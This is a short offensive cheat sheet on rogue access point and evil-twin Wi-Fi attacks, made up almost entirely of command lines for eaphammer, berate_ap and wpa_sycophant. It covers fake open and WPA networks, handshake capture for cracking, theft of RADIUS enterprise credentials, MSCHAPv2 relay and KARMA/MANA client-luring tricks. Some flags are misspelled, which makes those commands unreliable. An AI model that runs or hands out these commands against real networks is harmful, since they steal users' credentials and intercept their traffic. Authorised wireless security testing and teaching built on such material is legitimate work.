# Rogue AP / Evil Twin  
##	Basic Open Hotspot  
		berate_ap <interface_AP> <interface_internet> <SSID>  
##	Open Network Evil Twin  
		airgeddon.sh  
		fluxion.sh  
		wifipumpkin3  
		eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID>  
##	WPA/WPA2-Personal Evil Twin  
		WPA Passphrase Known  
			eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase <passphrase>  
		WPA Passphrase Unknown  
			Spawn Open Network Evil Twin instead to attack clients (e.g. Phishing attack to retrieve Passphrase)  
			Capture WPA (half) Handshake of connecting clients & Cracking  
				eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase randompassphrase --capture-wpa-handhshake  
##	WPA/WPA2-Enterprise Evil Twin  
###		RADIUS Credentials Unknown  
####			RADIUS Credentials Stealing  
			eaphammer --cert-wizard  
	                eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID> --creds  
			Possible if:  
                    - EAP method does not use client-certificat for client authentication  
                    - Server certificate validation not enforced on client  
			EAP (MSCHAPv2) Relay  
				berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout <file_captured_creds> <interface_AP> <interface_internet> <SSID>  
                wpa_sycophant.sh -c wpa_sycophant_example.conf -i <interface>  
				Possible if:  
                    - Target network uses EAP method with MSCHAPv2 for client authentication  
                    - Server certificate validation not enforced on client  
###		RADIUS Credentials Known  
			ehdb --add --identity <username> --password <password> # Add credentials in db  
   		         ehdb --add --identity <username> --nt-hash <ntlm_hash>  # Add creds with NTLM hash in db  
		            eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap  --essid <SSID_corporate_wifi>  

###	802.11 Network Selection Algorithms Abuse (for Open Network)  
		KARMA Attack (outdated)  
			By default with wifiphisher  
		MANA Attack (KARMA improvement)  
			Add --mana option in eaphammer command  
		Loud MANA (MANA Improvement)  
			Add --mana --loud in eaphammer command  
		Known Beacons Attack  
			Add --mana --knwon-beacons in eaphammer command  
			Abuse clients' passive scanning  
